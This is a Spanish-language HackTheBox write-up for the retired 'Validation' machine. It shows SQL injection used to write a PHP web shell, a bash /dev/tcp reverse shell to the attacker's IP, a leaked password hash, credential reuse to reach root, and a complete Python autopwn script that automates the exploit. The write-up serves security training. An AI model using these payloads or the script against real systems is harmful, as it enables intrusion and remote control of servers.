---
title: Validation
layout: page
permalink: /HTB_Validation
---

<h2 class="amarillo">HackTheBox - Validation WriteUp - Máquina retirada</h2>
<div id="logos" style="text-align: center;">
  <img src="/assets/images/HTB/Validation/Validation.png" alt="under" oncontextmenu="return false;">
</div>

Comenzamos encendiendo la maquina Validation y obtenemos la dirección IP 10.129.95.235 y para identificar a que sistema operativo nos estamos enfrentando en base al TLL
<div style="text-align: center;">
  <img src="/assets/images/HTB/Validation/1.png" alt="under" oncontextmenu="return false;">
</div>
![[HTB/Machines/Validation/Images/1.png]]
Y vemos que tenemos un TLL de 63 por tanto estamos frente una maquina Linux

<h2 class="amarillo">Enumeración</h2>

Comenzamos enumerando la maquina identificando los puertos que estén abiertos `nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn` y exportamos la captura 
<div style="text-align: center;">
  <img src="/assets/images/HTB/Validation/2.png" alt="under" oncontextmenu="return false;">
</div>

Y vemos que tenemos los puertos abiertos 22 80 4566 8080, con estos puertos procedemos a hacer un escaneo exhaustivo para identificar la version y servicio y corren para cada uno de estos puertos
<div style="text-align: center;">
  <img src="/assets/images/HTB/Validation/3.png" alt="under" oncontextmenu="return false;">
</div>

Vemos un puerto 80 con el servicio http (una pagina web) la cual enumeraremos con whatweb

<div style="text-align: center;">
  <img src="/assets/images/HTB/Validation/4.png" alt="under" oncontextmenu="return false;">
</div>

Probamos a hacer algo de fuzzing con un diccionario de mil y pico rutas que nos trae nmap `--script http-enum`
<div style="text-align: center;">
  <img src="/assets/images/HTB/Validation/5.png" alt="under" oncontextmenu="return false;">
</div>

A pesar de encontrar una ruta /accounts.php, iremos primero a la web

<div style="text-align: center;">
  <img src="/assets/images/HTB/Validation/6.png" alt="under" oncontextmenu="return false;">
</div>

Vemos que podemos registrar usuarios en la pagina web y que el texto que pongamos en username se ve reflejado en la web, y las tecnologías que tiene la web vemos que tiene php
<div style="text-align: center;">
  <img src="/assets/images/HTB/Validation/7.png" alt="under" oncontextmenu="return false;">
</div>

Y accediendo a /account.php con nuestro input malicioso en username:

```javascript
alert("XSS")
```

<div style="text-align: center;">
  <img src="/assets/images/HTB/Validation/8.png" alt="under" oncontextmenu="return false;">
</div>

La pagina es vulnerable a XSS, pero viendo que podemos listar diferentes tipos de usuarios seleccionando el país probamos a realizar una inyección SQL filtrando todo el trafico en el proxy de BurpSuite

<div style="text-align: center;">
  <img src="/assets/images/HTB/Validation/9.png" alt="under" oncontextmenu="return false;">
</div>

Hacemos el SQLI hasta que encontramos información relevante

<div style="text-align: center;">
  <img src="/assets/images/HTB/Validation/10.png" alt="under" oncontextmenu="return false;">
</div>

<div style="text-align: center;">
  <img src="/assets/images/HTB/Validation/11.png" alt="under" oncontextmenu="return false;">
</div>

<div style="text-align: center;">
  <img src="/assets/images/HTB/Validation/12.png" alt="under" oncontextmenu="return false;">
</div>

A pesar de encontrar columnas interesantes no hay nada
<div style="text-align: center;">
  <img src="/assets/images/HTB/Validation/13.png" alt="under" oncontextmenu="return false;">
</div>

<div style="text-align: center;">
  <img src="/assets/images/HTB/Validation/14.png" alt="under" oncontextmenu="return false;">
</div>

<div style="text-align: center;">
  <img src="/assets/images/HTB/Validation/15.png" alt="under" oncontextmenu="return false;">
</div>

Encontramos lo que parece ser un usuario uhc

```
uhc:*C6A38A5736CBA87E617301ECAB64184671128718
```

Suponiendo que nos encontramos en el directorio /var/www/html y que podemos abusar del SQL mediante el SQLi probamos a subir un prueba.txt

```sql
select "prueba" into outfile "/var/www/html/prueba.txt"-- -
```

<div style="text-align: center;">
  <img src="/assets/images/HTB/Validation/16.png" alt="under" oncontextmenu="return false;">
</div>

Y accediendo de la URL vemos el contenido del archivo prueba.txt

<div style="text-align: center;">
  <img src="/assets/images/HTB/Validation/17.png" alt="under" oncontextmenu="return false;">
</div>

Siguiendo este principio probamos a subir una reverse shell con php

```php
<?php echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>"; ?>
```

Intentando acceder a nuestra reverse subiéndola aprovechándonos del SQLi

```sql
select "<?php echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>"; ?>" into outfile "/var/www/html/reverse.php"-- -
```

Vemos que se ha creado la reverse shell y que la pagina web nos interpreta nuestro código malicioso
<div style="text-align: center;">
  <img src="/assets/images/HTB/Validation/18.png" alt="under" oncontextmenu="return false;">
</div>

Probamos a ejecutar **whoami** y perfecto
<div style="text-align: center;">
  <img src="/assets/images/HTB/Validation/19.png" alt="under" oncontextmenu="return false;">
</div>

Por consecuencia tratamos de entablarnos una conexión remota con bash
```bash
bash -c "bash -i %26> /dev/tcp/10.10.16.42/443 0>%261"
```
<div style="text-align: center;">
  <img src="/assets/images/HTB/Validation/20.png" alt="under" oncontextmenu="return false;">
</div>

Y estando en escucha recibimos la reverse shell, seguido hacemos un tratamiento de la TTY
<div style="text-align: center;">
  <img src="/assets/images/HTB/Validation/21.png" alt="under" oncontextmenu="return false;">
</div>

Revisando un poco los archivos de configuración vemos una credencial y volvemos a ver el usuario uhc

<div style="text-align: center;">
  <img src="/assets/images/HTB/Validation/22.png" alt="under" oncontextmenu="return false;">
</div>

Probamos a conectarnos como el usuario uhc pero vemos que en el directorio /home/ este usuario no existe, haciendo un hostname -I vemos que estamos en un contenedor
<div style="text-align: center;">
  <img src="/assets/images/HTB/Validation/23.png" alt="under" oncontextmenu="return false;">
</div>

Probamos a conectarnos por ssh y reutilizando la credencial del usuario uhc habremos completado la maquina

<div style="text-align: center;">
  <img src="/assets/images/HTB/Validation/24.png" alt="under" oncontextmenu="return false;">
</div>

De paso quiero compartir un script autopwn en python para acceder al www-data

<div style="text-align: center;">
  <img src="/assets/images/HTB/Validation/poc.png" alt="under" oncontextmenu="return false;">
</div>

```python
#!/usr/bin/env python3
# Autor: Juan García aka liandd
import sys
import signal
from termcolor import colored
import requests
import argparse
import threading
from pwn import *


# Ctrl_C
def def_handler(sig, frame):
    print(colored("\n[!] Saliendo...\n", "red"))
    sys.exit(1)


# Ctrl_C
signal.signal(signal.SIGINT, def_handler)


def get_arguments():
    parser = argparse.ArgumentParser(
        description=colored("AutoPwn Validation", "red")+colored(" HTB", "green")+" by "+colored("liandd", "red"))
    parser.add_argument('-u', '--url', dest="URL",
                        help="Machine URL to Pwn (i.e --url http://10.129.95.235)")
    parser.add_argument('-i', '--ip', dest="IP",
                        help="IP address to get shell (i.e --IP 10.10.16.42)")
    parser.add_argument('-p', '--port', dest="PORT",
                        help="PORT to get shell (i.e --port 443)")

    options = parser.parse_args()
    if options.URL is None or options.IP is None or options.PORT is None:
        parser.print_help()
        print("\n\n")
        sys.exit(1)
    return options.URL, options.IP, options.PORT


def upload_file(URL):
    data = {'username': 'blyat',
            'country': """Uruguay' union select "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"-- -"""}

    r = requests.post(URL, data=data)


def intrusion(URL, IP, PORT):
    data = {
        'cmd': "/bin/bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1' " % (IP, PORT)}

    r = requests.get(URL + "/shell.php", params=data)


def main():
    URL, IP, PORT = get_arguments()
    upload_file(URL)

    try:
        threading.Thread(target=intrusion, args=(URL, IP, PORT)).start()
    except Exception as e:
        print(colored(e, "red"))

    shell = listen(PORT, timeout=20).wait_for_connection()
    shell.interactive()


if __name__ == '__main__':
    main()
```

<div style="text-align: center;">
  <img src="/assets/images/HTB/Validation/pwn3d.png" alt="under" oncontextmenu="return false;">
</div>